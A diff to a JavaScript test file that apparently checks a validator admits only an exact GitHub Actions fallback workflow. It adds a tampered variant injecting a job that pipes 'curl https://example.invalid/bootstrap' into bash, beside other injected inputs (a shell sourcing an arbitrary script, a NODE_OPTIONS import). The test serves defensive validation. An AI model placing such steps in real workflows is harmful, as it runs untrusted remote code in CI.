@@ -353,6 +353,17 @@ test('admits only the exact personal-repository fallback workflow source', () =>
       'defaults:\n  run:\n    shell: bash -c "source ./arbitrary.sh; {0}"\n\npermissions: {}',
     ),
     content.replace(
+      'jobs:\n',
+      [
+        'jobs:',
+        '  "arbitrary-job":',
+        '    "runs-on": ubuntu-latest',
+        '    "steps":',
+        '      - run: curl https://example.invalid/bootstrap | bash',
+        '',
+      ].join('\n'),
+    ),
+    content.replace(
       '    environment:\n      name: operator-merge-approval',
       '    "env":\n      NODE_OPTIONS: --import=./arbitrary.mjs\n    environment:\n      name: operator-merge-approval',
     ),
